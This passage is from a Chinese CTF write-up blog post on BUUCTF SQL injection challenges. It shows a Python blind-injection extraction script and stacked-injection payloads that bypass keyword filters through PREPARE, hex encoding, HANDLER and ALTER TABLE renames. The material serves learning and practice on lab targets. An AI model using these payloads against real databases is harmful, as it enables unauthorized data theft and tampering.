class="hljs-string">&quot;0^(ascii(substr(database(),&#123;i&#125;,1))&gt;&#123;mid&#125;)&quot;</span>,<br>    <span class="hljs-comment"># 表长 2</span><br>    <span class="hljs-string">&quot;&quot;</span>,<br>    <span class="hljs-comment"># 表名 3</span><br>    <span class="hljs-string">&quot;&quot;</span>,<br>    <span class="hljs-comment"># 列长 4</span><br>    <span class="hljs-string">&quot;&quot;</span>,<br>    <span class="hljs-comment"># 列名 5</span><br>    <span class="hljs-string">&quot;&quot;</span>,<br><br>    <span class="hljs-string">&quot;&quot;</span>,<br>    <span class="hljs-comment"># 内容 7</span><br>    <span class="hljs-string">&quot;0^(ascii(substr((select(concat(flag))from(flag)),&#123;i&#125;,1))&gt;&#123;mid&#125;)&quot;</span><br>]<br><br>method=<span class="hljs-number">1</span>               <span class="hljs-comment"># get:0  post+url:1  post+json:2</span><br>parameters_url=&#123;<span class="hljs-string">&quot;id&quot;</span>:<span class="hljs-string">&quot;&quot;</span>&#125;        <span class="hljs-comment"># method=1</span><br>target_url=<span class="hljs-string">&quot;id&quot;</span>                 <span class="hljs-comment"># method=1</span><br>parameters_json=&#123;<span class="hljs-string">&quot;username&quot;</span>:<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-string">&quot;password&quot;</span>:<span class="hljs-string">&quot;1&quot;</span>&#125;      <span class="hljs-comment"># method=2</span><br>target_json=<span class="hljs-string">&quot;username&quot;</span>                             <span class="hljs-comment"># method=2</span><br><br>keywords = <span class="hljs-string">&quot;glzjin&quot;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">boolean_query</span>(<span class="hljs-params">url,payload</span>):<br>    <span class="hljs-keyword">if</span> method == <span class="hljs-number">0</span>:<br>        r = requests.get(url + payload)<br>    <span class="hljs-keyword">elif</span> method == <span class="hljs-number">1</span>:<br>        parameters_url[target_url] = payload<br>        r = requests.post(url, data=parameters_url)<br>    <span class="hljs-keyword">elif</span> method == <span class="hljs-number">2</span>:<br>        parameters_json[target_json]=payload<br>        r = requests.post(url, json=parameters_json)<br>    <span class="hljs-keyword">return</span> keywords <span class="hljs-keyword">in</span> r.text  <span class="hljs-comment"># 这里判断页面是否存在关键字</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_length</span>(<span class="hljs-params">url,payload</span>):<br>    <span class="hljs-keyword">if</span> payload == <span class="hljs-string">&quot;&quot;</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, <span class="hljs-number">200</span>):<br>        <span class="hljs-keyword">if</span> boolean_query(url,payload):<br>            <span class="hljs-keyword">return</span> i<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_name</span>(<span class="hljs-params">url,length,payload</span>):<br>    results=[]<br>    <span class="hljs-keyword">if</span> length == <span class="hljs-number">0</span>:<br>        length = <span class="hljs-number">400</span><br>    name = <span class="hljs-string">&quot;&quot;</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,length+<span class="hljs-number">1</span>):<br>        low, high = <span class="hljs-number">32</span>, <span class="hljs-number">126</span><br>        <span class="hljs-keyword">while</span> low &lt; high:<br>            time.sleep(<span class="hljs-number">0.1</span>)<br>            mid = (low + high) // <span class="hljs-number">2</span><br>            tmp_payload = payload.<span class="hljs-built_in">format</span>(i=i,mid=mid)<br>            <span class="hljs-keyword">if</span> boolean_query(url,tmp_payload):<br>                low = mid + <span class="hljs-number">1</span><br>            <span class="hljs-keyword">else</span>:<br>                high = mid<br>        <span class="hljs-keyword">if</span> low == <span class="hljs-number">32</span>:  <span class="hljs-comment"># ASCII 32 = 空格，表示结束</span><br>            <span class="hljs-keyword">break</span><br>        name += <span class="hljs-built_in">chr</span>(low)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-built_in">chr</span>(low),end=<span class="hljs-string">&quot;&quot;</span>)<br>    <span class="hljs-keyword">return</span> name<br><br>payload = payloads[x]<br>length = get_length(url,payload)<br>result = get_name(url,length,payload)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;\n[+] Found : <span class="hljs-subst">&#123;result&#125;</span>&quot;</span>)<br></code></pre></td></tr></table></figure>
+
+<p>一开始先查了数据库，后面发现没必要</p>
+<p>![](&#x2F;img&#x2F;BUUCTF SQL刷题&#x2F;SThibFGh1oDzufxI7Flcvf0hnAe.png)</p>
+<p>![](&#x2F;img&#x2F;BUUCTF SQL刷题&#x2F;GyP3byDCsoSIwIxCzVhc7X5KnTg.png)</p>
+<h1 id="强网杯-2019-随便注"><a href="#强网杯-2019-随便注" class="headerlink" title="[强网杯 2019]随便注"></a>[强网杯 2019]随便注</h1><p>刚学，先用 BP 和相关字典 fuzz 一下，可以比较高效地探测哪些函数、关键字、符号不可用</p>
+<p>例如本题当输入 <code>select</code> 时直接给出了过滤的范围，联合注入可以排除</p>
+<p>![](&#x2F;img&#x2F;BUUCTF SQL刷题&#x2F;Lan7bHQDHoQ3ZjxZfkuchz97nbd.png)</p>
+<p>输入 <code>1 or 1=1</code> 时能正常回显</p>
+<p>![](&#x2F;img&#x2F;BUUCTF SQL刷题&#x2F;T2uWbq5ePoqP3mxBp8OcFk7JnSg.png)</p>
+<p>输入 <code>1&#39; or &#39;1&#39;=&#39;1</code> 时同样正常</p>
+<p>![](&#x2F;img&#x2F;BUUCTF SQL刷题&#x2F;IYEpbtlTPoe8BJxOxUccDGYnnhp.png)</p>
+<p>这个时候则会报错</p>
+<p>![](&#x2F;img&#x2F;BUUCTF SQL刷题&#x2F;W9kabh3tTo0Vzqx8uRbconPAn1e.png)</p>
+<p>说明后面还有查询语句，以单引号闭合，所以后面还要补上注释符 <code>1&#39; or 1=1#</code>，此时显示了所有内容</p>
+<p>![](&#x2F;img&#x2F;BUUCTF SQL刷题&#x2F;H45dbqPdvoQqrqxcB9GcFtednRf.png)</p>
+<p>接下来尝试堆叠注入，要避免直接使用 select 和 where，<code>1&#39;;show databases;#</code> 查看数据库</p>
+<p>![](&#x2F;img&#x2F;BUUCTF SQL刷题&#x2F;A7nFbsJaroJVDDxMSlkcrG6anXr.png)</p>
+<p>继续查看表 <code>1&#39;;show tables;#</code></p>
+<p>![](&#x2F;img&#x2F;BUUCTF SQL刷题&#x2F;HScpbJe1SofO5vxYmuvcMersn0d.png)</p>
+<p>接下来查看列可以使用 <code>1&#39;; show columns from tableName;#</code> 或 <code>1&#39;;desc tableName;#</code>。注意，<u>如果 tableName 是纯数字，需要用反引号</u>&#96;&#96;&#96;<u>包裹</u>，所以输入 <code>1&#39;;desc </code> 1919810931114514 <code>;#</code></p>
+<p>![](&#x2F;img&#x2F;BUUCTF SQL刷题&#x2F;EdW7blyC1oBOcGxwqCkcWCQrntg.png)</p>
+<p>得到列名后想要获取具体内容一般都需要依靠 select 和 where，这里参考别人总结的四种方法学习尝试一下</p>
+<h2 id="方法一：预编译-字符串拼接绕过"><a href="#方法一：预编译-字符串拼接绕过" class="headerlink" title="方法一：预编译 + 字符串拼接绕过"></a>方法一：预编译 + 字符串拼接绕过</h2><p>通过预编译的方式拼接 select 关键字：<code>1&#39;;PREPARE hacker from concat(&#39;s&#39;,&#39;elect&#39;, &#39; * from </code> 1919810931114514 <code> &#39;);EXECUTE hacker;#</code>。预编译相当于定一个语句相同，参数不同的 Mysql 模板，我们可以通过预编译的方式，绕过特定的字符过滤。之前有学习过通过预编译防御 SQL 注入攻击，但这是第一次用预编译来绕过防护。</p>
+<p>预编译的格式如下：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">PREPARE</span> 名称 <span class="hljs-keyword">FROM</span> <span class="hljs-keyword">Sql</span>语句 ? ;<br><span class="hljs-keyword">SET</span> <span class="hljs-variable">@x</span><span class="hljs-operator">=</span>xx;<br><span class="hljs-keyword">EXECUTE</span> 名称 <span class="hljs-keyword">USING</span> <span class="hljs-variable">@x</span>;<br></code></pre></td></tr></table></figure>
+
+<p>例如：正常查询使用 <code>SElECT * FROM t_user WHERE USER_ID = 1</code>，预编译则可以如下操作</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs sql">方法一：<br><span class="hljs-keyword">PREPARE</span> jia <span class="hljs-keyword">FROM</span> <span class="hljs-string">&#x27;SElECT * FROM t_user WHERE USER_ID = 1&#x27;</span>;<br><span class="hljs-keyword">EXECUTE</span> jia;<br><br>方法二：<br><span class="hljs-keyword">PREPARE</span> jia <span class="hljs-keyword">FROM</span> <span class="hljs-string">&#x27;SELECT * FROM t_user WHERE USER_ID = ?&#x27;</span>;<br><span class="hljs-keyword">SET</span> <span class="hljs-variable">@ID</span> <span class="hljs-operator">=</span> <span class="hljs-number">1</span>;<br><span class="hljs-keyword">EXECUTE</span> jia <span class="hljs-keyword">USING</span> <span class="hljs-variable">@ID</span>;<br><br>方法三：<br><span class="hljs-keyword">SET</span> <span class="hljs-variable">@SQL</span><span class="hljs-operator">=</span><span class="hljs-string">&#x27;SElECT * FROM t_user WHERE USER_ID = 1&#x27;</span>;<br><span class="hljs-keyword">PREPARE</span> jia <span class="hljs-keyword">FROM</span> <span class="hljs-variable">@SQL</span>;<br><span class="hljs-keyword">EXECUTE</span> jia;<br></code></pre></td></tr></table></figure>
+
+<p>本题因为可以堆叠注入且过滤了 select 关键字，所以先将关键字拆开通过 concat 方法拼接并预编译，来绕过检测，然后再执行预编译好的查询语句获取 flag。</p>
+<p>![](&#x2F;img&#x2F;BUUCTF SQL刷题&#x2F;D3TEbhvlPopwvIxQkQ7cVK9gnzN.png)</p>
+<h2 id="方法二：预编译-十六进制编码绕过"><a href="#方法二：预编译-十六进制编码绕过" class="headerlink" title="方法二：预编译 + 十六进制编码绕过"></a>方法二：预编译 + 十六进制编码绕过</h2><p>可以直接将 <code>select * from </code> 1919810931114514&#96;&#96; 语句进行 16 进制编码，即：<code>73656c656374202a2066726f6d20603139313938313039333131313435313460</code>，替换 payload 预编译：</p>
+<p><code>1&#39;;PREPARE hacker from 0x73656c656374202a2066726f6d20603139313938313039333131313435313460;EXECUTE hacker;#</code></p>
+<p>基本原理同上</p>
+<h2 id="方法三：handler-替换-select（仅-MySQL）"><a href="#方法三：handler-替换-select（仅-MySQL）" class="headerlink" title="方法三：handler 替换 select（仅 MySQL）"></a>方法三：handler 替换 select（仅 MySQL）</h2><p><code>1&#39;;HANDLER </code> 1919810931114514 <code>OPEN;HANDLER</code> 1919810931114514 <code>READ FIRST;HANDLER</code> 1919810931114514 <code> CLOSE;#</code> 直接获取 flag</p>
+<p>mysql 除可使用 select 查询表中的数据，也可使用 handler 语句，这条语句使我们能够一行一行的浏览一个表中的数据，不过 handler 语句并不具备 select 语句的所有功能，并且是 mysql 专用的语句，并没有包含到 SQL 标准中。</p>
+<p>handler 使用格式：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs sql">打开表：<br>HANDLER 表名 <span class="hljs-keyword">OPEN</span> ;<br><br>查看数据：<br>HANDLER 表名 READ next;<br><br>关闭表：<br>HANDLER 表名 READ <span class="hljs-keyword">CLOSE</span>;<br></code></pre></td></tr></table></figure>
+
+<p>本题即先用 handler 打开 <code>1919810931114514</code> 表，读取表的第一行数据，然后关闭表</p>
+<h2 id="方法四：根据原本查询语句的逻辑修改表名和列名（相对取巧）"><a href="#方法四：根据原本查询语句的逻辑修改表名和列名（相对取巧）" class="headerlink" title="方法四：根据原本查询语句的逻辑修改表名和列名（相对取巧）"></a>方法四：根据原本查询语句的逻辑修改表名和列名（相对取巧）</h2><p>我们输入 1 后，默认会显示 id 为 1 的数据，可以猜测默认显示的是 words 表的数据，那么只要更改目标表的名称和结构为 words 表、words 表改成其他名称，就可以达到利用原有查询语句直接查询 flag 字段的值的效果</p>
+<p>修改表名、添加列的语法格式：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs sql">修改表名：<br><span class="hljs-keyword">ALTER</span> <span class="hljs-keyword">TABLE</span> 旧表名 RENAME <span class="hljs-keyword">TO</span> 新表名;<br><br>修改字段：<br><span class="hljs-keyword">ALTER</span> <span class="hljs-keyword">TABLE</span> 表名 CHANGE 旧字段名 新字段名 新数据类型;<br><br>添加列：<br><span class="hljs-keyword">alter</span> <span class="hljs-keyword">table</span> TABLE_NAME <span class="hljs-keyword">add</span> <span class="hljs-keyword">column</span> NEW_COLUMN_NAME <span class="hljs-type">varchar</span>(<span class="hljs-number">255</span>) <span class="hljs-keyword">not</span> <span class="hljs-keyword">null</span> <span class="hljs-keyword">first</span>;<br></code></pre></td></tr></table></figure>
+
+<p>查看 words 表结构 <code>1&#39;;desc words;#</code> 总共两个字段 id 和 data，推测应该是输入 id 给出对应 data</p>
+<p>![](&#x2F;img&#x2F;BUUCTF SQL刷题&#x2F;TnErbguBhoNNlgxeylXc356Fnh7.png)</p>
+<p>那么我们可以把 words 表随便改成其他名称，然后把目标 1919810931114514 表改成 words，再把列名 flag 改成 data，在最前列添加 id 列即可实现查询</p>
+<p><code>1&#39;; alter table words rename to words1;alter table </code> 1919810931114514 <code>rename to words;alter table words change flag data varchar(50);alter table words add column id int(10) not null first;#</code></p>
+<p>执行后，先读取了原本 words 表的 id&#x3D;1 的 data 并返回输出</p>
+<p>![](&#x2F;img&#x2F;BUUCTF SQL刷题&#x2F;H2nHbYVZRoI1r7xBQKZcaohhnRg.png)</p>
+<p>输入（id）0 查询，即得 flag</p>
+<p>![](&#x2F;img&#x2F;BUUCTF SQL刷题&#x2F;D8gdb3B62oci4Ix8brjc1Xbon2b.png)</p>
+<p>或者参考我所参考的知乎那篇 wp，直接将 flag 重命名为 id，然后 <code>1&#39; or 1=1#</code> 查看所有内容</p>
+<h2 id="参考："><a href="#参考：" class="headerlink" title="参考："></a>参考：</h2><p><a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/545713669">https://zhuanlan.zhihu.com/p/545713669</a></p>
+<p><a target="_blank" rel="noopener" href="https://ek1ng.com/notes.html#%E5%BC%BA%E7%BD%91%E6%9D%AF2019-%E9%9A%8F%E4%BE%BF%E6%B3%A8">https://ek1ng.com/notes.html#%E5%BC%BA%E7%BD%91%E6%9D%AF2019-%E9%9A%8F%E4%BE%BF%E6%B3%A8</a></p>
+<h1 id="SUCTF-2019-EasySQL"><a href="#SUCTF-2019-EasySQL" class="headerlink" title="[SUCTF 2019]EasySQL"></a>[SUCTF 2019]EasySQL</h1><p>还是先用 BP 扫一遍，可以看到许多关键词如 and、from、information 被过滤，联合注入、报错注入基本排除</p>
+<p>![](&#x2F;img&#x2F;BUUCTF SQL刷题&#x2F;T6Trb69KpoBDWDx9kDmcnkqEnsc.png)</p>
+<p>综合考虑先尝试堆叠注入，输入 <code>1;show databases;#</code>，成功获取数据库名，说明是数字型无需其他闭合，且堆叠注入可行</p>
+<p>![](&#x2F;img&#x2F;BUUCTF SQL刷题&#x2F;KGXUbk5GooGT6Sxv8ypcLW5xnoh.png)</p>
+<p>继续输入 <code>1;show tables;#</code>，发现 Flag 表</p>
+<p>![](&#x2F;img&#x2F;BUUCTF SQL刷题&#x2F;HaLqbQoEcoXOvSxR864cGDk3nth.png)</p>
+<p>尝试 handler 读取 <code>1;handler Flag open;handler Flag read first;handler Flag close;#</code>，结果发现 Flag 被过滤，因为 handler 和 from 被过滤，也无法使用前一题的预编译绕过，其他各种绕过方法试了一遍，过长时也会拦截，最后只能借鉴网上的 WP。</p>
+<p>这道题需要推测查询语句的大致结构，这里的 sql 语句为 <code>select $post[&#39;query&#39;]||flag from Flag</code>，表现出来的特征是输入非零时有回显，输入 0 或其他字符时均无回显或是报错，做题时需要根据这个特征推测才能继续做下去。</p>
+<h2 id="方法一：修改-sql-mode"><a href="#方法一：修改-sql-mode" class="headerlink" title="方法一：修改 sql_mode"></a>方法一：修改 sql_mode</h2><p>修改 MySQL 服务的环境变量 sql_mode，用于设置 MySQL 支持的语法和数据校验模式。本题将 sql_mode 设为 <code>pipes_as_concat</code>，作用是将 || 的作用由 or 变为拼接字符串。</p>
+<p>所以输入 <code>1;set sql_mode=PIPES_AS_CONCAT;select 1</code> 时原有的查询语句就会将 <code>select 1</code> 和 <code>select flag from Flag</code> 的结果拼接在一起返回。</p>
+<p>![](&#x2F;img&#x2F;BUUCTF SQL刷题&#x2F;F3LUbtmpFomIgYxYKTscUwpSnZd.png)</p>
+<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">附加几种常见的sql_mode值的介绍：<br><br>几种常见的mode介绍<br>ONLY_FULL_GROUP_BY：出现在<span class="hljs-keyword">select</span>语句、<span class="hljs-keyword">HAVING</span>条件和<span class="hljs-keyword">ORDER</span> <span class="hljs-keyword">BY</span>语句中的列，必须是<span class="hljs-keyword">GROUP</span> <span class="hljs-keyword">BY</span>的列或者依赖于<span class="hljs-keyword">GROUP</span> <span class="hljs-keyword">BY</span>列的函数列。<br><br>NO_AUTO_VALUE_ON_ZERO：该值影响自增长列的插入。默认设置下，插入<span class="hljs-number">0</span>或<span class="hljs-keyword">NULL</span>代表生成下一个自增长值。如果用户希望插入的值为<span class="hljs-number">0</span>，而该列又是自增长的，那么这个选项就有用了。<br><br>STRICT_TRANS_TABLES：在该模式下，如果一个值不能插入到一个事务表中，则中断当前的操作，对非事务表不做限制<br><br>NO_ZERO_IN_DATE：这个模式影响了是否允许日期中的月份和日包含<span class="hljs-number">0</span>。如果开启此模式，<span class="hljs-number">2016</span><span class="hljs-number">-01</span><span class="hljs-number">-00</span>是不允许的，但是<span class="hljs-number">0000</span><span class="hljs-number">-02</span><span class="hljs-number">-01</span>是允许的。它实际的行为受到 <span class="hljs-keyword">strict</span> mode是否开启的影响<span class="hljs-number">1</span>。<br><br>NO_ZERO_DATE：设置该值，mysql数据库不允许插入零日期。它实际的行为受到 strictmode是否开启的影响<span class="hljs-number">2</span>。<br><br>ERROR_FOR_DIVISION_BY_ZERO：在<span class="hljs-keyword">INSERT</span>或<span class="hljs-keyword">UPDATE</span>过程中，如果数据被零除，则产生错误而非警告。如果未给出该模式，那么数据被零除时MySQL返回<span class="hljs-keyword">NULL</span><br><br>NO_AUTO_CREATE_USER：禁止<span class="hljs-keyword">GRANT</span>创建密码为空的用户<br><br>NO_ENGINE_SUBSTITUTION：如果需要的存储引擎被禁用或未编译，那么抛出错误。不设置此值时，用默认的存储引擎替代，并抛出一个异常<br><br>PIPES_AS_CONCAT：将”||”视为字符串的连接操作符而非或运算符，这和Oracle数据库是一样的，也和字符串的拼接函数Concat相类似<br><br>ANSI_QUOTES：启用ANSI_QUOTES后，不能用双引号来引用字符串，因为它被解释为识别符<br></code></pre></td></tr></table></figure>
+
+<h2 id="方法二：满足-的条件"><a href="#方法二：满足-的条件" class="headerlink" title="方法二：满足 || 的条件"></a>方法二：满足 || 的条件</h2><p>如果 <code>$post[‘query’]</code> 的数据为 <code>*,1</code>，sql 语句就变成了 <code>select *,1||flag from Flag</code>，也就是 <code>select *,1 from Flag</code>，可以直接查询出 Flag 表中的所有内容。输入 <code>1;select *,1</code></p>
+<p>![](&#x2F;img&#x2F;BUUCTF SQL刷题&#x2F;Zey3bJzAMoqJcIx0tC7c8lErnyc.png)</p>
+<h2 id="参考：-1"><a href="#参考：-1" class="headerlink" title="参考："></a>参考：</h2><p><a target="_blank" rel="noopener" href="https://ek1ng.com/notes.html#SUSCTF2019-EasySQL">https://ek1ng.com/notes.html#SUSCTF2019-EasySQL</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/gtx690/p/13176458.html">https://www.cnblogs.com/gtx690/p/13176458.html</a></p>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/Note-Summary/" class="category-chain-item">Note&amp;Summary</a>
+  
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/CTF/" class="print-no-link">#CTF</a>
+      
+        <a href="/tags/web/" class="print-no-link">#web</a>
+      
+        <a href="/tags/SQL/" class="print-no-link">#SQL</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>BUUCTF SQL 刷题</div>
+      <div>http://5i1encee.top/2025/03/12/BUUCTF SQL刷题/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>5i1encee</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2025年3月12日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2025/03/02/Hgame2025WP/" title="Hgame2025 WP">
+                        <span class="hidden-mobile">Hgame2025 WP</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+  
+  
+    <article id="comments" lazyload>
+      
+  <div id="valine"></div>
+  <script type="text/javascript">
+    Fluid.utils.loadComments('#valine', function() {
+      Fluid.utils.createScript('https://lib.baomitu.com/valine/1.5.1/Valine.min.js', function() {
+        var options = Object.assign(
+          {"appId":"sYa0TwEtqgwqBctM2qchGbMG-gzGzoHsz","appKey":"Et6unsKpmF1YFlS3U5IE9nlB","path":"window.location.pathname","placeholder":"请友好交流哦~","avatar":"retro","meta":["nick","mail","link"],"requiredFields":[],"pageSize":10,"lang":"zh-CN","highlight":true,"recordIP":false,"serverURLs":"https://sya0twet.lc-cn-n1-shared.com","emojiCDN":null,"emojiMaps":null,"enableQQ":true},
+          {
+            el: "#valine",
+            path: window.location.pathname
+          }
+        )
+        new Valine(options);
+        Fluid.utils.waitElementVisible('#valine .vcontent', () => {
+          var imgSelector = '#valine .vcontent img:not(.vemoji)';
+          Fluid.plugins.imageCaption(imgSelector);
+          Fluid.plugins.fancyBox(imgSelector);
+        })
+      });
+    });
+  </script>
+  <noscript>Please enable JavaScript to view the comments</noscript>
+
+
+    </article>
+  
+
+
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <footer class="mt-4"> <font size="2" face="Georgia"> <div class="text-center py-3"> <div style="font-size: 0.85rem"> <span id="timeDate">载入天数...</span> <span id="times">载入时分秒...</span> <script src="/js/duration.js"></script> </div> <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
